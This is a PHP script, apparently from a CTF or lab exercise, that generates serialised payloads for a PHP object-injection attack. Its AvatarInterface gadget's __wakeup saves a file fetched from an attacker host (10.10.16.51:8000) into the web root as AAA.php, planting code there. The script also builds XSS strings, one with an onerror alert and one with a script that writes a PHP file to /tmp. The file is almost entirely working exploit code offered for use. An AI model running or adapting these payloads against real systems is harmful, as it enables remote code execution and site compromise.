<?php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
        $this->theme = $theme;
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        // $f = fopen($this->imgPath, "w");
        // fwrite($f, file_get_contents($tmp));
        // fclose($f);
        print("Pronti");
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __construct($imgPath, $tmp) {
        $this->imgPath = $imgPath;
        $this->tmp = $tmp;
    }

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$user = new AvatarInterface("/var/www/html/AAA.php", "http://10.10.16.51:8000/AAA.php");
$ser = serialize($user);
var_dump($ser);

$pref = new UserPrefs("\"><img src=xxx:x onerror=javascript:alert(1)> <p class=\"");
$pref = new UserPrefs("\"><script>const fs = require('fs');fs.writeFileSync('/tmp/AAA.php', '<?php echo phpinfo(); ?>');</script> <p class=\"");
$ser = serialize($pref);
echo $ser;

?>
